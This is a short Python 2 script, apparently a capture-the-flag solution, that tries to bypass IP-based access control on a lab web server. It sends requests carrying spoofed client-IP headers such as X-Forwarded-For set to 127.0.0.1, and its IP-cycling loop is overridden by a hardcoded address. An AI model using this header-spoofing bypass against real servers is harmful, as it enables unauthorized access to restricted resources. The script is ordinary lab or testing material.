import urllib2

challenge_url = "http://192.168.102.101/A2fjd123--/"
source_ip = "192.168.102."
content = "Access Denied"
last_val = 0

while "Access Denied" in content and last_val <= 255:

	# Request setup
	req = urllib2.Request(challenge_url)
	try_ip = source_ip + str(last_val)
	try_ip = "127.0.0.1"
	print(try_ip)

	# Add header and make request
	req.add_header('X-Forwarded-For', try_ip)
	req.add_header('X-Remote-IP', try_ip)
	req.add_header('X-Originating-IP', try_ip)
	req.add_header('X-Client-IP', try_ip)
	req.add_header('X-Forwarded-Host', try_ip)
	req.add_header('X-Remote-Addr', try_ip)

	resp = urllib2.urlopen(req)
	content = resp.read()

	last_val += 1

print(content)
